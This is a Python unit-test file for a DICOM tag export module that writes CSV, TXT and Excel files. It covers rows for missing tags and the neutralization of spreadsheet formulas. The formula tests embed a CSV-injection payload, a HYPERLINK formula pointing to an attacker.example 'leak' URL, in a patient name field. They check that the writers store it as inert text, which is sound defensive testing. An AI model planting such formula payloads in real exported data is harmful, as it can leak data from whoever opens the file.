"""Tests for DICOM tag export CSV/Excel writers (missing-tag rows)."""

import csv
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from pydicom.dataset import Dataset
from pydicom.tag import Tag

from core.tag_export_writer import write_csv_files, write_excel_file, write_txt_files


class TestTagExportWriterMissingRows(unittest.TestCase):
    def test_csv_includes_empty_row_when_missing_and_flag_true(self) -> None:
        ds = Dataset()
        ds.PatientName = "Test^Patient"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))  # not on dataset
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [str(Tag(0x0010, 0x0010)), missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path,
                variation,
                studies,
                selected,
                [str(Tag(0x0010, 0x0010)), missing_tag],
                include_private=False,
                include_missing_selected_tags=True,
            )
            out_file = os.path.join(tmp, "out.csv")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        tags_exported = [r[1] for r in data_rows]
        self.assertIn(str(Tag(0x0010, 0x0010)), tags_exported)
        self.assertIn(missing_tag, tags_exported)
        kvp_row = next(r for r in data_rows if r[1] == missing_tag)
        self.assertEqual(kvp_row[3], "")

    def test_csv_skips_missing_when_flag_false(self) -> None:
        ds = Dataset()
        ds.PatientName = "A"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path,
                variation,
                studies,
                selected,
                [missing_tag],
                include_private=False,
                include_missing_selected_tags=False,
            )
            out_file = os.path.join(tmp, "out.csv")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        self.assertEqual(len(data_rows), 0)

    def test_txt_includes_empty_row_when_missing_and_flag_true(self) -> None:
        ds = Dataset()
        ds.PatientName = "Test^Patient"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [str(Tag(0x0010, 0x0010)), missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.txt")
            write_txt_files(
                path,
                variation,
                studies,
                selected,
                [str(Tag(0x0010, 0x0010)), missing_tag],
                include_private=False,
                include_missing_selected_tags=True,
            )
            out_file = os.path.join(tmp, "out.txt")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f, delimiter="\t"))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        tags_exported = [r[1] for r in data_rows]
        self.assertIn(str(Tag(0x0010, 0x0010)), tags_exported)
        self.assertIn(missing_tag, tags_exported)
        kvp_row = next(r for r in data_rows if r[1] == missing_tag)
        self.assertEqual(kvp_row[3], "")


class TestTagExportFormulaNeutralization(unittest.TestCase):
    """Attacker-controlled tag text must not become a live spreadsheet formula."""

    PAYLOAD = '=HYPERLINK("https://attacker.example/leak","review")'

    def _build_inputs(self):
        ds = Dataset()
        ds.PatientName = self.PAYLOAD
        ds.SeriesDescription = "=evil-series"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        patient_name_tag = str(Tag(0x0010, 0x0010))
        variation = {
            "ser1": {"varying_tags": [], "constant_tags": [patient_name_tag]}
        }
        return studies, selected, variation, patient_name_tag

    def test_csv_neutralizes_formula_value(self) -> None:
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            with open(path, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        value_cell = next(r[3] for r in rows if len(r) >= 4 and r[0] == "All")
        self.assertEqual(value_cell, "'" + self.PAYLOAD)
        # Series header must not start with a formula trigger either.
        series_cell = next(r[0] for r in rows if r and r[0].startswith(("Series", "'Series")))
        self.assertFalse(series_cell[:1] in ("=", "+", "-", "@"))

    def test_txt_neutralizes_formula_value(self) -> None:
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.txt")
            write_txt_files(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            with open(path, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f, delimiter="\t"))
        value_cell = next(r[3] for r in rows if len(r) >= 4 and r[0] == "All")
        self.assertEqual(value_cell, "'" + self.PAYLOAD)

    def test_xlsx_neutralizes_formula_value(self) -> None:
        openpyxl = __import__("openpyxl")
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.xlsx")
            write_excel_file(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            wb = openpyxl.load_workbook(path)
            ws = wb[wb.sheetnames[0]]
            value_cells = [
                c.value
                for col in ws.iter_cols()
                for c in col
                if isinstance(c.value, str) and self.PAYLOAD in c.value
            ]
        self.assertTrue(value_cells)
        for cell in value_cells:
            # Stored as inert text (apostrophe-prefixed), never a formula cell.
            self.assertTrue(cell.startswith("'="))


if __name__ == "__main__":
    unittest.main()
